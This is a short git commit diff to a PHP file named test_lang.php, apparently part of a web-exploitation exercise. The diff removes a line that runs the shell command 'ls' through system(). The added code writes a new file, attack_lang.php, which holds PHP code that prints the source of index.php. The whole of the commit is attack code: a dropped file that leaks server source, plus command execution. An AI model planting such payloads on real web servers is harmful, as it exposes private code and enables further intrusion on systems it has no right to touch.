d53c4f6750658ff63901971b037d0e53511d00ad
Zeldarfleau122 <34440348+Zeldarfleau122@users.noreply.github.com>
2018-12-30 18:20:08 +0100

    Update test_lang.php

--- test_lang.php
+++ test_lang.php
@@ -1,3 +1,6 @@
 <?php 
-echo(system("ls")) ;
+$myfile = fopen("attack_lang.php", "w") or die("Unable to open file!");
+$txt = "<?php show_source('index.php');?>";
+fwrite($myfile, $txt);
+fclose($myfile);
 ?>
